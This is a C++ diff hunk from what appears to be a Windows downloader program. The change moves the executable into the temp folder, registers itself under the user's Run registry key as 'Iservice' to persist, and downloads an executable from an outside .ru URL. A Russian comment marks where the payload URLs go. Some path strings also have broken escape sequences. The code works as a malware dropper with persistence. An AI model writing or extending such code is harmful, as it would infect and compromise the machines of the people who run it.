@@ -392,9 +392,12 @@ int _tmain(int argc, _TCHAR* argv[])
 	//CreateDirectory(_T("C:\\Program Files\\IUservice"), NULL);
 	TCHAR szTempPathBuffer[MAX_PATH];
 	GetTempPath(MAX_PATH, szTempPathBuffer);
+	std::wstring filePath = szTempPathBuffer;
+	filePath += L"\install.exe";
+	MoveFile(szPath, filePath.c_str());
 	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
 	RegSetValueEx(newValue, _T("Iservice"), 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
-	std::wstring filePath = szTempPathBuffer;
+	filePath = szTempPathBuffer;
 	filePath += L"\iuservice.exe";
 	HRESULT hr1 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/iuservice.exe"), filePath.c_str(), 0, NULL);
 	// Здесь прописать урл файлов и под каким именем их сохранять
